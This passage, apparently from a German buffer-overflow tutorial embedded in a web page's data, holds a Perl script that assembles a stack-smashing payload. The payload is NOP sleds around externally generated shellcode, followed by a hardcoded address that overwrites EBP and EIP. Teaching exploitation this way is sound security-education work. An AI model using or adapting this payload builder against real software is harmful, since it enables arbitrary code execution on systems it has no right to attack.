IV ist 8 Byte gr\xf6\xdfer als die angegebene Pufferl\xe4nge (f\xfcr EBP und EIP).\\n    \\n    ```perl\\n    #!/usr/bin/perl -w\\n    use strict;\\n     \\n    if (2 != scalar @ARGV) {\\n     die \\"./shellcode.pl  \\\\n\\";\\n    }\\n     \\n    my $buffer_length = $ARGV[0];\\n    my $nop_length2 = $ARGV[1];\\n     \\n    binmode STDOUT;\\n     \\n    chomp (my $shellcode_length = \\\\`./shellcode -l\\\\`);\\n    my $shellcode = \\\\`./shellcode\\\\`;\\n    my $nop_length1 = $buffer_length - $shellcode_length;\\n    my $eip_recurrence=1;\\n     \\n    print STDERR \\"shellcode length: $shellcode_length bytes\\\\n\\";\\n    print STDERR \\"buffer length:    $buffer_length bytes\\\\n\\";\\n    print STDERR \\"nop sliding 1:    $nop_length1 bytes\\\\n\\";\\n    print STDERR \\"nop sliding 2:    $nop_length2 bytes\\\\n\\";\\n     \\n    my $eip = chr(0x20) . chr(0x75) . chr(0x04) . chr(0x08);\\n    my $ebp = $eip;\\n    \\n    my $nop_slide1 = (chr(0x90)x$nop_length1);\\n    my $nop_slide2 = (chr(0x90)x$nop_length2);\\n    my $iv = $nop_slide1 . $shellcode . $nop_slide2 . $ebp . ($eip x $eip_recurrence);\\n     \\n    print STDOUT $iv;\\n    ```"}]}}')}}]);